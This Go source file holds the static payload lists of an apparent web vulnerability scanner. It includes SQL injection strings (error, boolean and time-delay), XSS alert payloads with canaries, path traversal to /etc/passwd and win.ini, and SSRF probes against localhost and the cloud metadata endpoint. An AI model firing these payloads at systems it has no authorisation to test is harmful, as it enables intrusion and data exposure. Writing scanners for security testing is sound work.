package scanner

// SQLiStrategy represents the type of SQLi attack
type SQLiStrategy string

const (
	SQLiError   SQLiStrategy = "error"
	SQLiBoolean SQLiStrategy = "boolean"
	SQLiTime    SQLiStrategy = "time"
)

// SQLiPayload represents a specific SQLi test case
type SQLiPayload struct {
	Value       string
	Strategy    SQLiStrategy
	Description string
	// Expected indicator for error-based
	ErrorRegexes []string
	// For boolean-based, target condition must return true/false
	IsTrueCondition bool
	// Expected time delay in seconds for time-based
	ExpectedDelaySec int
}

// XSSPayload represents a test case for cross-site scripting
type XSSPayload struct {
	Value       string
	Description string
	Canary      string // A unique substring to check reflection
}

// PathTraversalPayload represents a local file traversal check
type PathTraversalPayload struct {
	Value            string
	Description      string
	TargetFile       string
	RequiredPatterns []string // Patterns to confirm file contents
}

// CSRFPayload represents an exploit format parameter check
type CSRFPayload struct {
	Value       string
	Description string
}

// SSRFPayload represents a server-side request forgery endpoint target
type SSRFPayload struct {
	Value            string
	Description      string
	RequiredPatterns []string
}

// Global Static Payloads Repository
var SQLiPayloads = []SQLiPayload{
	// Error-Based
	{
		Value:    "1' OR '1'='1",
		Strategy: SQLiError,
		Description: "Classic single quote query string breakout",
		ErrorRegexes: []string{
			`(?i)you have an error in your sql syntax`,
			`(?i)unclosed quotation mark`,
			`(?i)mysql_query`,
			`(?i)sqlite3_prepare`,
			`(?i)pg_query`,
			`(?i)ora-01756`,
		},
	},
	{
		Value:    "1\" OR \"1\"=\"1",
		Strategy: SQLiError,
		Description: "Double quote query string breakout",
		ErrorRegexes: []string{
			`(?i)you have an error in your sql syntax`,
			`(?i)unclosed quotation mark`,
			`(?i)mysql_query`,
			`(?i)sqlite3_prepare`,
			`(?i)pg_query`,
		},
	},
	// Boolean-Based
	{
		Value:           "1' AND '1'='1",
		Strategy:        SQLiBoolean,
		Description:     "Boolean-blind true condition check",
		IsTrueCondition: true,
	},
	{
		Value:           "1' AND '1'='2",
		Strategy:        SQLiBoolean,
		Description:     "Boolean-blind false condition check",
		IsTrueCondition: false,
	},
	// Time-Based
	{
		Value:            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
		Strategy:         SQLiTime,
		Description:      "MySQL Time sleep injection",
		ExpectedDelaySec: 5,
	},
	{
		Value:            "1' AND pg_sleep(5)--",
		Strategy:         SQLiTime,
		Description:      "PostgreSQL Time sleep injection",
		ExpectedDelaySec: 5,
	},
	{
		Value:            "1' AND WAITFOR DELAY '0:0:5'--",
		Strategy:         SQLiTime,
		Description:      "MSSQL Time delay injection",
		ExpectedDelaySec: 5,
	},
}

var XSSPayloads = []XSSPayload{
	{
		Value:       "<script>alert('lastresort_xss')</script>",
		Description: "Standard script tag alert payload",
		Canary:      "lastresort_xss",
	},
	{
		Value:       "\"><script>alert('lastresort_attr')</script>",
		Description: "Double quote element attribute breaker",
		Canary:      "lastresort_attr",
	},
	{
		Value:       "javascript:alert('lastresort_proto')",
		Description: "javascript URI scheme injection",
		Canary:      "lastresort_proto",
	},
	{
		Value:       "\" onerror=\"alert('lastresort_err')\"",
		Description: "Inline tag event handler injection",
		Canary:      "lastresort_err",
	},
}

var PathTraversalPayloads = []PathTraversalPayload{
	{
		Value:       "../../../../etc/passwd",
		Description: "Linux passwd file traversal",
		TargetFile:  "/etc/passwd",
		RequiredPatterns: []string{
			`root:x:0:0`,
			`bin:x:1:1`,
		},
	},
	{
		Value:       "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
		Description: "Windows win.ini file traversal",
		TargetFile:  "win.ini",
		RequiredPatterns: []string{
			`\[fonts\]`,
			`\[extensions\]`,
			`\[files\]`,
		},
	},
}

var CSRFPayloads = []CSRFPayload{
	{
		Value:       "csrf_exploit_form",
		Description: "Hidden form submission simulation",
	},
}

var SSRFPayloads = []SSRFPayload{
	{
		Value:       "http://127.0.0.1:80",
		Description: "Local host server query",
		RequiredPatterns: []string{
			`localhost`,
			`127.0.0.1`,
		},
	},
	{
		Value:       "http://169.254.169.254/latest/meta-data/",
		Description: "AWS/Cloud metadata endpoint query",
		RequiredPatterns: []string{
			`ami-id`,
			`instance-id`,
			`security-groups`,
		},
	},
}
